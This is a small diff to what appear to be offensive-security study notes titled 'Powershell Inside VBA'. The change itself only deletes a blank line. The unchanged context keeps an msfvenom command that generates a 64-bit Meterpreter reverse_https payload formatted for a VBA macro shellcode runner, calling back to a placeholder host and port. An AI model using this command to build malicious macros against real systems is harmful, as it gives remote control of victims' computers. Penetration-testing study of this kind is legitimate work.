@@ -12,7 +12,6 @@ nav_order: 1
 
 ## Powershell Inside VBA ##
 
-
 1. Must use 64 bit for the Powershell shellcode runner:
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
 
